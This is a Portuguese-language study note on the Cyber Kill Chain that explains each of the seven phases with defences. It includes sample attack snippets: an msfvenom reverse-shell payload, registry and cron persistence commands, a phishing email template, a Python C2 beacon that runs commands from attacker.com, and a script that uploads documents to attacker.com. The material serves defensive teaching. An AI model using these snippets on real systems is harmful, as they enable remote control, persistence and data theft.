
# ⚔️ Cyber Kill Chain

> **Tags:** #cyber-kill-chain #framework #ataque #defesa #lockheed-martin #seguranca

---

## 📌 Visão Geral

A **Cyber Kill Chain** é um modelo criado pela **Lockheed Martin** que descreve as **7 etapas** de um ataque cibernético, desde o reconhecimento inicial até o objetivo final.

🎯 **Objetivo:** Cada fase representa um **ponto de interrupção** onde a defesa pode detectar e parar o ataque.

---

## 🔗 As 7 Fases da Cyber Kill Chain

┌─────────────────────────────────────────────────────────┐
│ 1. Reconnaissance (Reconhecimento)                                            │
│ 2. Weaponization (Armação)                                                          │
│ 3. Delivery (Entrega)                                                                       │ 
│ 4. Exploitation (Exploração)                                                            │
│ 5. Installation (Instalação)                                                               │
│ 6. Command & Control (C2)                                                           │
│ 7. Actions on Objectives (Ações nos Objetivos)                             │ └─────────────────────────────────────────────────────────┘

---

## 1️⃣ Reconnaissance (Reconhecimento) 🔍

### Descrição
O atacante **coleta informações** sobre o alvo usando fontes públicas e técnicas de OSINT.

### Técnicas Utilizadas
- **OSINT (Open Source Intelligence)**
  - Pesquisa em redes sociais
  - LinkedIn (funcionários, estrutura organizacional)
  - WHOIS (informações de domínio)
  - Google Dorking
  - Shodan (dispositivos expostos)

- **Varredura de Rede**
  - Nmap
  - Masscan
  - Identificação de portas abertas

- **Engenharia Social**
  - Coleta de e-mails
  - Identificação de tecnologias usadas
  - Mapeamento de hierarquia

### Exemplos de Informações Coletadas
- 📧 E-mails corporativos
- 🏢 Estrutura organizacional
- 💻 Tecnologias utilizadas (software, hardware)
- 🌐 Infraestrutura de rede
- 👥 Nomes de funcionários

### Defesa
- ✅ Limitar informações públicas
- ✅ Treinamento de funcionários (não expor dados sensíveis)
- ✅ Monitorar menções à empresa na internet
- ✅ Políticas de privacidade em redes sociais

---

## 2️⃣ Weaponization (Armação) 🛠️

### Descrição
Com base nas informações coletadas, o invasor **desenvolve ou escolhe** uma ferramenta (malware, exploit) para atacar o alvo.

### Atividades
- Criação de **malware customizado**
- Seleção de **exploit** adequado à vulnerabilidade identificada
- Preparação de **documento malicioso** (PDF, DOCX com macro)
- Configuração de **payload**

### Ferramentas Comuns
- **Metasploit:** Framework de exploração
- **Cobalt Strike:** Red team tool
- **Empire/PowerShell Empire:** Post-exploitation
- **Veil-Evasion:** Bypass de antivírus

### Exemplo
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-ufl90sfbr" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Criar payload com Metasploit</span><span>
</span><span>msfvenom </span><span class="token parameter" style="color:rgb(214, 222, 235)">-p</span><span> windows/meterpreter/reverse_tcp </span><span class="token" style="color:rgb(199, 146, 234)">\</span><span>
</span><span>         </span><span class="token assign-left" style="color:rgb(214, 222, 235)">LHOST</span><span class="token" style="color:rgb(127, 219, 202)">=</span><span class="token" style="color:rgb(247, 140, 108)">192.168</span><span>.1.100 </span><span class="token assign-left" style="color:rgb(214, 222, 235)">LPORT</span><span class="token" style="color:rgb(127, 219, 202)">=</span><span class="token" style="color:rgb(247, 140, 108)">4444</span><span> </span><span class="token" style="color:rgb(199, 146, 234)">\</span><span>
</span><span>         </span><span class="token parameter" style="color:rgb(214, 222, 235)">-f</span><span> exe </span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span> malware.exe
</span></code></pre></div>

### Defesa
- ✅ Threat intelligence (identificar malwares conhecidos)
- ✅ Sandbox para análise de arquivos suspeitos
- ✅ Assinaturas de antivírus atualizadas

---

## 3️⃣ Delivery (Entrega) 📦

### Descrição
O atacante **envia a arma** criada ao alvo.

### Métodos de Entrega

#### 📧 E-mail (Phishing/Spear Phishing)
- Anexo malicioso
- Link para download
- Credenciais falsas

#### 🌐 Site Comprometido (Watering Hole)
- Infectar site que o alvo visita frequentemente
- Drive-by download

#### 💾 Mídia Removível
- USB infectado deixado propositalmente
- CD/DVD malicioso

#### 🌍 Redes Sociais
- Mensagens diretas com links
- Perfis falsos

### Exemplo de E-mail de Phishing

```
De: rh@empresa-falsa.com Para: funcionario@empresa.com Assunto: Atualização de Política de RH

Prezado funcionário,

Anexo segue a nova política de benefícios. Por favor, revise e assine o documento.

[Anexo: politica_rh.docx.exe]
```
### Defesa
- ✅ **Filtros de e-mail** (SPF, DKIM, DMARC)
- ✅ **Sandbox** para análise de anexos
- ✅ **Treinamento de phishing** para funcionários
- ✅ **Bloqueio de executáveis** via e-mail
- ✅ **Web filtering**

---

## 4️⃣ Exploitation (Exploração) 💥

### Descrição
Após a entrega, o invasor **explora vulnerabilidades** no sistema para executar o malware ou obter acesso inicial.

### Tipos de Exploração

#### 🐛 Exploração de Vulnerabilidade
- CVE conhecido (ex: EternalBlue - MS17-010)
- Zero-day exploit
- Falha em software desatualizado

#### 👤 Exploração de Usuário
- Macro maliciosa em documento
- Script em navegador
- Engenharia social

### Exemplos
- **CVE-2017-0144 (EternalBlue):** Exploração de SMBv1
- **CVE-2021-44228 (Log4Shell):** RCE em Apache Log4j
- **Macro VBA maliciosa** em documento Office

### Defesa
- ✅ **Patch management** rigoroso
- ✅ **Desabilitar macros** por padrão
- ✅ **Application whitelisting**
- ✅ **Least privilege** (menor privilégio)
- ✅ **Segmentação de rede**

---

## 5️⃣ Installation (Instalação) 🔧

### Descrição
O malware é **instalado** no sistema, permitindo **persistência** e **movimentação lateral**.

### Técnicas de Persistência

#### 🪟 Windows
- **Registry Run Keys**

<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">cmd</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-8gfb6ug2y" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-cmd" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>  reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Malware /t REG_SZ /d &quot;C:\malware.exe&quot;
</span></code></pre></div>

- **Scheduled Tasks**
- **Services**
- **WMI Event Subscriptions**

#### 🐧 Linux
- **Cron jobs**
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-eiohpwc2s" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>  </span><span class="token" style="color:rgb(199, 146, 234)">(</span><span>crontab -l</span><span class="token" style="color:rgb(199, 146, 234)">;</span><span> </span><span class="token" style="color:rgb(255, 203, 139)">echo</span><span> </span><span class="token" style="color:rgb(173, 219, 103)">&quot;@reboot /tmp/malware.sh&quot;</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span> </span><span class="token" style="color:rgb(127, 219, 202)">|</span><span> </span><span class="token" style="color:rgb(130, 170, 255)">crontab</span><span> -
</span></code></pre></div>
- **Systemd services**
- **.bashrc / .profile**

### Movimentação Lateral
- **Pass-the-Hash**
- **Kerberoasting**
- **Exploração de confiança entre sistemas**

### Backdoors
- Criação de contas de usuário ocultas
- Abertura de portas no firewall
- Instalação de RAT (Remote Access Trojan)

### Defesa
- ✅ **EDR/XDR** (Endpoint Detection and Response)
- ✅ **Monitoramento de Registry/Cron**
- ✅ **Whitelisting de aplicações**
- ✅ **Segmentação de rede**
- ✅ **Least privilege**

---

## 6️⃣ Command & Control (C2) 📡

### Descrição
O invasor estabelece **comunicação** com o sistema comprometido, enviando comandos e recebendo dados.

### Protocolos C2 Comuns
- **HTTP/HTTPS:** Disfarçado como tráfego web normal
- **DNS:** Tunneling via queries DNS
- **IRC:** Canais de chat
- **Custom Protocols:** Protocolos proprietários

### Técnicas de Evasão
- **Domain Generation Algorithm (DGA):** Gera domínios aleatórios
- **Fast Flux:** Mudança rápida de IPs
- **Encrypted C2:** Comunicação criptografada
- **Beaconing:** Comunicação periódica (heartbeat)

### Ferramentas C2
- **Cobalt Strike**
- **Empire/PowerShell Empire**
- **Metasploit (Meterpreter)**
- **Covenant**

### Exemplo de Beacon
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">python</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-l0q4adtt6" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-python" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(127, 219, 202)">import</span><span> requests
</span><span></span><span class="token" style="color:rgb(127, 219, 202)">import</span><span> time
</span>
<span>C2_SERVER </span><span class="token" style="color:rgb(127, 219, 202)">=</span><span> </span><span class="token" style="color:rgb(173, 219, 103)">&quot;https://attacker.com/c2&quot;</span><span>
</span>
<span></span><span class="token" style="color:rgb(127, 219, 202)">while</span><span> </span><span class="token" style="color:rgb(255, 88, 116)">True</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span>
</span><span>    response </span><span class="token" style="color:rgb(127, 219, 202)">=</span><span> requests</span><span class="token" style="color:rgb(199, 146, 234)">.</span><span>get</span><span class="token" style="color:rgb(199, 146, 234)">(</span><span>C2_SERVER</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span>
</span><span>    command </span><span class="token" style="color:rgb(127, 219, 202)">=</span><span> response</span><span class="token" style="color:rgb(199, 146, 234)">.</span><span>text
</span>
<span>    </span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Executar comando</span><span>
</span><span>    output </span><span class="token" style="color:rgb(127, 219, 202)">=</span><span> os</span><span class="token" style="color:rgb(199, 146, 234)">.</span><span>popen</span><span class="token" style="color:rgb(199, 146, 234)">(</span><span>command</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span class="token" style="color:rgb(199, 146, 234)">.</span><span>read</span><span class="token" style="color:rgb(199, 146, 234)">(</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span>
</span>
<span>    </span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Enviar resultado</span><span>
</span><span>    requests</span><span class="token" style="color:rgb(199, 146, 234)">.</span><span>post</span><span class="token" style="color:rgb(199, 146, 234)">(</span><span>C2_SERVER</span><span class="token" style="color:rgb(199, 146, 234)">,</span><span> data</span><span class="token" style="color:rgb(127, 219, 202)">=</span><span class="token" style="color:rgb(199, 146, 234)">{</span><span class="token" style="color:rgb(173, 219, 103)">&quot;output&quot;</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span> output</span><span class="token" style="color:rgb(199, 146, 234)">}</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span>
</span>
<span>    time</span><span class="token" style="color:rgb(199, 146, 234)">.</span><span>sleep</span><span class="token" style="color:rgb(199, 146, 234)">(</span><span class="token" style="color:rgb(247, 140, 108)">60</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span>  </span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Beacon a cada 60 segundos</span><span>
</span></code></pre></div>

### Defesa
- ✅ **Firewall de saída** (egress filtering)
- ✅ **IDS/IPS** (Suricata, Snort)
- ✅ **DNS monitoring**
- ✅ **Proxy web** com inspeção SSL
- ✅ **Network segmentation**
- ✅ **Threat intelligence feeds**

---

## 7️⃣ Actions on Objectives (Ações nos Objetivos) 🎯

### Descrição
Nesta fase final, o atacante **alcança seus objetivos**.

### Objetivos Comuns

#### 💰 Financeiro
- **Ransomware:** Criptografar dados e exigir resgate
- **Banking Trojan:** Roubar credenciais bancárias
- **Cryptojacking:** Minerar criptomoedas

#### 🕵️ Espionagem
- **Exfiltração de dados** sensíveis
- **Propriedade intelectual**
- **Segredos comerciais**

#### 💣 Sabotagem
- **Destruição de dados**
- **Interrupção de serviços**
- **Dano à infraestrutura**

#### 🎭 Hacktivismo
- **Defacing de sites**
- **Vazamento de dados**
- **Protesto político**

### Técnicas de Exfiltração

#### 🌐 Via Rede
- **FTP/SFTP**
- **HTTP POST**
- **DNS Tunneling**
- **Cloud Storage** (Dropbox, Google Drive)

#### 💾 Via Mídia Física
- **USB**
- **E-mail** (arquivos compactados)

### Exemplo de Exfiltração
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">python</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-0t2a2r1nl" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-python" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(127, 219, 202)">import</span><span> requests
</span><span></span><span class="token" style="color:rgb(127, 219, 202)">import</span><span> os
</span>
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Comprimir dados sensíveis</span><span>
</span><span>os</span><span class="token" style="color:rgb(199, 146, 234)">.</span><span>system</span><span class="token" style="color:rgb(199, 146, 234)">(</span><span class="token" style="color:rgb(173, 219, 103)">&quot;tar -czf data.tar.gz /home/user/documents&quot;</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span>
</span>
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Enviar para servidor C2</span><span>
</span><span></span><span class="token" style="color:rgb(127, 219, 202)">with</span><span> </span><span class="token" style="color:rgb(130, 170, 255)">open</span><span class="token" style="color:rgb(199, 146, 234)">(</span><span class="token" style="color:rgb(173, 219, 103)">&quot;data.tar.gz&quot;</span><span class="token" style="color:rgb(199, 146, 234)">,</span><span> </span><span class="token" style="color:rgb(173, 219, 103)">&quot;rb&quot;</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span> </span><span class="token" style="color:rgb(127, 219, 202)">as</span><span> f</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span>
</span><span>    requests</span><span class="token" style="color:rgb(199, 146, 234)">.</span><span>post</span><span class="token" style="color:rgb(199, 146, 234)">(</span><span class="token" style="color:rgb(173, 219, 103)">&quot;https://attacker.com/upload&quot;</span><span class="token" style="color:rgb(199, 146, 234)">,</span><span> files</span><span class="token" style="color:rgb(127, 219, 202)">=</span><span class="token" style="color:rgb(199, 146, 234)">{</span><span class="token" style="color:rgb(173, 219, 103)">&quot;file&quot;</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span> f</span><span class="token" style="color:rgb(199, 146, 234)">}</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span>
</span></code></pre></div>

### Defesa
- ✅ **DLP (Data Loss Prevention)**
- ✅ **Monitoramento de tráfego de saída**
- ✅ **Backups imutáveis** (proteção contra ransomware)
- ✅ **Incident Response Plan**
- ✅ **Forensics readiness**

---

## 🛡️ Defesa em Cada Fase

| Fase | Controles Defensivos |
|------|---------------------|
| **Reconnaissance** | Limitar informações públicas, OSINT monitoring |
| **Weaponization** | Threat intelligence, sandbox analysis |
| **Delivery** | Email filtering, web filtering, user training |
| **Exploitation** | Patch management, application whitelisting |
| **Installation** | EDR/XDR, registry monitoring, least privilege |
| **C2** | Firewall egress, IDS/IPS, DNS monitoring |
| **Actions** | DLP, backup, incident response |

---

## 🔗 Relação com Outros Frameworks

### MITRE ATT&CK
A Cyber Kill Chain é **mais simples** e **linear** que o MITRE ATT&CK.

**Diferenças:**
- **Kill Chain:** 7 fases lineares
- **ATT&CK:** 14 táticas com centenas de técnicas

**Complementaridade:**
- Kill Chain = visão macro
- ATT&CK = detalhamento técnico

---

## 🔗 Links Relacionados

- [[MITRE-ATT&CK]]
- [[Malwares]]
- [[Tipos-de-Ataques]]
- [[OSINT-Fundamentos]]
- [[Defesa-em-Profundidade]]

---

## 📚 Referências

- Lockheed Martin - Intelligence-Driven Computer Network Defense
- MITRE ATT&CK Framework
- NIST Cybersecurity Framework